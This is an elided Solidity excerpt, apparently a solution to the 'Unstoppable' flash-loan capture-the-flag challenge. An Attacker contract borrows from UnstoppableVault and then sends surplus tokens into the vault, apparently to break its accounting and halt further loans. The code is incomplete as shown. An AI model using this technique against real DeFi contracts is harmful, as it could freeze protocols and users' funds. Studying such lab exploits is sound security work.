...
contract UnstoppableVault is IERC3156FlashLender, ReentrancyGuard, Owned, ERC4626, Pausable {
        ...
        returns (bool)
    {
        ...
        console.log(convertToShares(totalSupply));
...
contract Attacker is IERC3156FlashBorrower {
    ...
    function attackLoan() external {
        uint256 maxLoan = vault.maxFlashLoan(address(token));
        token.approve(address(vault), type(uint256).max);
        vault.flashLoan(IERC3156FlashBorrower(address(this)), address(token), (maxLoan / 2) -1, "");
    }
    ...
    function onFlashLoan(
        ...
        require(msg.sender == address(vault), "Caller is not the lender");
        require(initiator == address(this), "Invalid loan initiator");

        // Use the flash loaned tokens
       // performActionWithLoan(amount, token, data);

        // Repay the loan (amount + fee)
        uint256 repayment = amount + fee;
        IERC20(token).transfer(address(vault), IERC20(token).balanceOf(address(this)) - repayment);

        // Indicate successful handling of the flash loan
